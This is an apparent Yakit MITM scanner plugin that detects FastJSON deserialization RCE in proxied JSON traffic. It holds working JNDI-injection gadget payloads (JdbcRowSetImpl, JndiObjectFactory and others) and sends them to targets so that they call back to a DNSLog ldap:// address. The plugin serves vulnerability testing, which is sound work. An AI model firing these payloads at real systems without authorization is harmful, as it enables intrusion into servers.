# mitm plugin template

#--------------------------WORKSPACE-----------------------------
__test__ = func() {
    results, err := yakit.GenerateYakitMITMHooksParams("GET", "http://192.168.101.177:8084/")
    if err != nil {
        
        return
    }
    isHttps, url, reqRaw, rspRaw, body = results
    mirrorNewWebsitePath(results...)
}

highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"{{params(reverseConnTarget)}}"}`,`{"{{randstr(2)}}":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"{{params(reverseConnTarget)}}"}}}`]
dnslogPayloads = [`{"{{randstr(2)}}":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`]
nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]


fastJsonCount = 0
lock = sync.NewLock()
addTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount++
    yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
}

subTask = func() {
    lock.Lock()
    defer lock.Unlock()

    fastJsonCount--
    if fastJsonCount > 0 {
        yakit_status("FastJSON 检查任务", sprint(fastJsonCount))
    }else{
        yakit_status("FastJSON 检查任务", "暂无执行中")
    }
}

mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    
    addTask()
    defer subTask()
    defer func {
        err = recover()
        if err != nil {
            log.error("MITM FastJSON ERROR: %v", err)
        }
    }

    host, port, err = str.ParseStringToHostPort(url)
    addr = str.HostPort(host, port)

    rspIns, err = poc.ParseBytesToHTTPResponse(rsp)
    reqIns, err = poc.ParseBytesToHTTPRequest(req)
    if err != nil {
        println(err)
        return
    }


    rsqContentType = str.Join(rspIns.Header["Content-Type"], "; ")
    reqContentType = str.Join(reqIns.Header["Content-Type"], "; ")
    if (!str.MatchAllOfSubString(str.ToLower(rsqContentType), "json")) && (!str.IsJsonResponse(rspIns)) && !str.MatchAllOfSubString(str.ToLower(reqContentType), "json"){
        return
    }

    yakit_output(sprintf("Start to check fastjson vuln for: %v", addr))
    freq, err = fuzz.HTTPRequest(req)
    die(err)

    yakit_output("Start to fetch DNSLog")
    domain, token, err = risk.NewDNSLogDomain()// "ldap://127.0.0.1:123/123"
    if err != nil {
        yakit_output(sprintf("Fetch DNSLog Failed: %s", err))
        return
    }
    yakit_output(sprintf("Fetch domain: %s",domain))
    reverseConnTarget = sprintf("ldap://%v/%v", domain, str.RandStr(10))
    freq, err = fuzz.HTTPRequest(req)
    if err != nil {
        yakit_output(sprintf("build http request failed: %s", err))
        return
    }

    payloadRes = []
    fuzzInfo = nil
    riskLevel = ""
    checkVul = fn(host,port){
        genPayload = fn(payloadRaw,rev) {
            return fuzz.StringsWithParam(payloadRaw, {"reverseConnTarget":rev})[0]
        }
        testPayload = fn(payload) {
            yakit_output(sprintf("Send payload: %s",payload))
            freq = freq.FuzzMethod("POST").FuzzHTTPHeader("Content-Type", "application/json").FuzzPostRaw(payload)
            res, err = freq.Exec(httpool.https(isHttps), httpool.size(1))
            for result = range res {
                results, err = risk.CheckDNSLogByToken(token)
                if err != nil {
                    yakit_output(sprintf("check dnslog result failed: %s", err))
                    continue
                }
                if len(results) > 0 {
                    fuzzInfo = result
                    payloadRes = append(payloadRes,payload)
                    return true
                }
            }
            return false
        }
        for _,dnslogPayload = range dnslogPayloads{
            if testPayload(genPayload(dnslogPayload,domain)){
                riskLevel = "middle"
                for _,payloadRaw = range nextPayload{
                    if testPayload(genPayload(payloadRaw,reverseConnTarget)){
                        riskLevel = "critical"
                        return true
                    }
                }
                return true
            }
        }
        for _,payloadRaw = range highVersionPayload{
            if testPayload(genPayload(payloadRaw,reverseConnTarget)){
                riskLevel = "critical"
                return true
            }
        }
        return false
    }
    
    if checkVul(host,port){
        yakit_output(sprintf("FastJson Found! %v", addr))
        
        risk.NewRisk(
            addr, risk.payload(str.Join(payloadRes, "\r\n")),
            risk.type("rce"), risk.level(riskLevel),
            risk.title(sprintf("FastJSON RCE via DNSLog: %v", addr)),
            risk.titleVerbose(sprintf("FastJSON 远程命令执行(DNSLog): %v", addr)),
            risk.details({
                "request": fuzzInfo.RequestRaw,
                "response": fuzzInfo.ResponseRaw,
                "token": token,
                "domain": domain,
            }),
            risk.token(token),
        )
    }else{
        yakit_output(sprintf("Target: %s is invulnerable", host))
    }
    
}
